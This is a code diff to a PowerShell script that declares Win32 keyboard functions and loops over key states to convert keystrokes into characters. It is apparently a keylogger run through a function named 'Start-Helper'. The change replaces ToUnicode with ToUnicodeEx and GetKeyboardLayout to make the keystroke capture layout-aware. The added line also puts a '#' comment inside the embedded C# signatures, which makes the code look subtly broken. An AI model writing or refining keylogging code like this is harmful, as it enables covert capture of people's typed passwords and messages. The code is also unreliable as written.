@@ -13,7 +13,9 @@ public static extern int GetKeyboardState(byte[] keystate);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int MapVirtualKey(uint uCode, int uMapType);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern IntPtr GetKeyboardLayout(uint idThread);   # Modified to include GetKeyboardLayout.
 '@
 
   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
@@ -43,7 +45,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
             $mychar = New-Object -TypeName System.Text.StringBuilder
 
-            $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+            $hkl = $API::GetKeyboardLayout(0)
+            $success = $API::ToUnicodeEx($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0, $hkl)
 
             if ($success) 
             {
@@ -74,4 +77,3 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 }
 
 Start-Helper
-
